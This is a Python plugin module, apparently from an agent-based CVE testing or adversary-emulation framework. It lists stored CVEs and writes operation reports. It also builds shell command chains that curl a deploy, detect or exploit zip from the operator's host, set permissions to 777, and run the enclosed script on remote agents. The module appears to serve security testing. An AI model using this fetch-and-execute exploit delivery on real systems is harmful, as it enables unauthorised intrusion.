import os.path
import sys

from time import sleep
import socket

import time

# def find_description(kernel_version, cve):
#     path = "../CVEs/useable/" + kernel_version + "/" + cve + "/des.txt"
#
#     if not os.path.exists(path):
#         return "Doesn't exist"
#
#     file = open(path, "r")
#     content = file.readlines()
#     character = {}
#     for i in content:
#         i = i.replace("\n", "")
#         i = i.split(": ")
#         if len(i) > 1:
#             character[i[0]] = i[1]
#
#     return character
#
#
# def list_platform():
#     data_path = "./plugins/manncmd/CVEs/useable/"
#     print(sys.path)
#     platform_list = os.listdir(data_path)
#     return platform_list
#
#
# def list_version(platform_version):
#     data_path = "../CVEs/useable/" + platform_version
#     if not os.path.exists(data_path):
#         return "Doesn't exist"
#     kernel_list = os.listdir(data_path)
#     return kernel_list
#
#
# def list_cve(platform_version):
#
#     data_path = "./plugins/manncmd/CVEs/useable/"+platform_version
#     if not os.path.exists(data_path):
#         return "Doesn't exist"
#     cve_list = os.listdir(data_path)
#     return cve_list
#
# def Set_flags(platform_version, selected_cve):
#     cve_path = "./plugins/manncmd/CVEs/useable/" + platform_version + "/" + selected_cve
#     if not os.path.exists(cve_path):
#         return "Doesn't exist"
#     cve_list = os.listdir(cve_path)
#     flags = ['description', 'deploy', 'detect', 'exploit', 'test_exploit', 'test_detect']
#     if 'deploy' not in cve_list:
#         flags.remove('deploy')
#     if 'exploit' not in cve_list:
#         flags.remove('exploit')
#         flags.remove('test_exploit')
#     return flags
#
#
# def construct_command(data):
#     platform_version = data['CVE_platform']
#     kernel_version = data['kernel_version']
#     cve = data['CVEs']
#     flag = data['flag']
#     cve_path = "./plugins/manncmd/CVEs/useable/"+platform_version+"/"+kernel_version+"/"+cve
#     selected_cve = os.listdir(cve_path)
#     if flag == 'description':
#         des_path = cve_path+"/des.txt"
#         file = open(des_path, "r")
#         content = file.readlines()
#         character = {}
#         for i in content:
#             i = i.replace("\n", "")
#             i = i.split(": ")
#             if len(i) > 1:
#                 character[i[0]] = i[1]
#         return character
#
#     if flag == 'deploy':
#         des_path = cve_path+"/deploy"
#         command = "ls"
#         return command
#
#     if flag == 'detect':
#         des_path = cve_path+"/detect"
#         command = "ls"
#         return command
#
#     if flag == 'exploit':
#         des_path = cve_path+"/exploit"
#         command = "ls"
#         return command


async def as_list_platform():
    data_path = "./plugins/manncmd/CVEs/useable/"
    print(sys.path)
    if not os.path.exists(data_path):
        return "Doesn't exist"
    platform_list = {'CVE_platform': os.listdir(data_path)}
    return platform_list


async def as_list_version(CVE_platform):
    data_path = "./plugins/manncmd/CVEs/useable/" + CVE_platform
    if not os.path.exists(data_path):
        return "Doesn't exist"
    kernel_list = {'kernel_version': os.listdir(data_path)}
    return kernel_list


async def as_list_cve(CVE_platform):
    data_path = "./plugins/manncmd/CVEs/useable/"+CVE_platform
    if not os.path.exists(data_path):
        return "Doesn't exist"
    cve_list = {'CVEs': os.listdir(data_path)}
    return cve_list

async def as_construct_command(data):
    platform_version = data['CVE_platform']
    kernel_version = data['kernel_version']
    cve = data['CVEs']
    flag = data['flag']
    cve_path = "./plugins/manncmd/CVEs/useable/"+platform_version+"/"+cve
    selected_cve = os.listdir(cve_path)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    # print(s.getsockname()[0])
    ip = s.getsockname()[0]
    s.close()
    if flag == 'description':
        des_path = cve_path+"/des.txt"
        file = open(des_path, "r")
        content = file.readlines()
        character = {}
        for i in content:
            i = i.replace("\n", "")
            i = i.split(": ")
            if len(i) > 1:
                character[i[0]] = i[1]
        return character

    if flag == 'deploy':
        des_path = cve_path+"/deploy"
        des_path += "/deploy.zip"
        ip_path = "http://"+ip+":8000/"
        command = "mkdir " + cve + "_deploy;"
        command += "cd " + cve + "_deploy;"
        command += "curl -O " + ip_path + des_path + ";"
        command += "unzip deploy.zip;"
        command += "chmod -R 777 *;"
        # command += "cd exploit;"
        command += "./deploy.sh > result;"
        return command

    if flag == 'detect':
        des_path = cve_path + "/detect"
        des_path += "/detect.zip"
        ip_path = "http://"+ip+":8000/"
        command = "mkdir " + cve + "_detect;"
        command += "cd " + cve + "_detect;"
        command += "curl -O " + ip_path + des_path + ";"
        command += "unzip detect.zip;"
        command += "chmod -R 777 *;"
        # command += "cd exploit;"
        command += "./detect.sh  > result;"
        return command

    if flag == 'exploit':
        des_path = cve_path+"/exploit"
        des_path += "/exploit.zip"
        ip_path = "http://"+ip+":8000/"
        command = "mkdir " + cve + "_exploit;"
        command += "cd " + cve + "_exploit;"
        command += "curl -O " + ip_path + des_path + ";"
        command += "unzip exploit.zip;"
        command += "chmod -R 777 *;"
        # command += "cd exploit;"
        command += "./exp.sh > result;"
        return command

    if flag == 'test_exploit':
        des_path = cve_path
        command = "cd " + cve + "_exploit;"
        command += "cat result;"
        return command

    if flag == 'test_detect':
        des_path = cve_path
        command = "cd " + cve + "_detect;"
        command += "cat result;"
        return command

async def Set_flags(platform_version, selected_cve):
    cve_path = "./plugins/manncmd/CVEs/useable/" + platform_version + "/" + selected_cve
    if not os.path.exists(cve_path):
        return "Doesn't exist"
    cve_list = os.listdir(cve_path)
    flags = ['description', 'deploy', 'detect', 'exploit', 'test_exploit', 'test_detect']
    if 'deploy' not in cve_list:
        flags.remove('deploy')
    if 'exploit' not in cve_list:
        flags.remove('exploit')
        flags.remove('test_exploit')
    if 'detect' not in cve_list:
        flags.remove('detect')
        flags.remove('test_detect')
    if 'des.txt' not in cve_list:
        flags.remove('description')
    return flags



async def as_export_report(data):
    log_path = "./plugins/manncmd/detect_log/"
    log_name = time.strftime('%Y-%m-%d-%H:%M:%S', time.localtime(time.time()))
    print(log_name)
    agent_name = data['Agent']
    data1 = data['OperationName']
    data2 = data['Commands']
    data3 = data['Result']
    dict_all = zip(data1,data2,data3)
    # for key,value in dict_all.items():
    #     print(key)
    #     print(value)
    with open(log_path+log_name+"-"+agent_name+".txt",'w') as f:
        f.write(log_name+"\n")
        ID = 1
        for data1,data2,data3 in dict_all:
            f.write(str(ID)+"\t")
            ID+=1;
            f.write(data1+"\t")
            f.write(data2+"\t")
            f.write(data3+"\n")
            #print("{0},{1}\n".format(key,value))



# def detection_test(data):
#     log_path = "./plugins/manncmd/detect_log/"
#     log_name = time.strftime('%Y-%m-%d-%H:%M:%S', time.localtime(time.time()))
#     print(log_name)
#     data1 = data[0]
#     data2 = data[1]
#     data3 = data[1]
#     dict_all = zip(data1,data2,data3)
#     with open(log_path+log_name+".txt",'w') as f:
#         f.write(log_name+"\n")
#         ID = 1
#         for data1,data2,data3 in dict_all:
#             f.write(str(ID)+"\t")
#             ID+=1;
#             f.write(data1+"\t")
#             f.write(data2+"\t")
#             f.write(data3+"\n")

# def threaded_function(arg):
#     for i in range(arg):
#         print("running")
#         sleep(1)



if __name__ == '__main__':
    print("local test")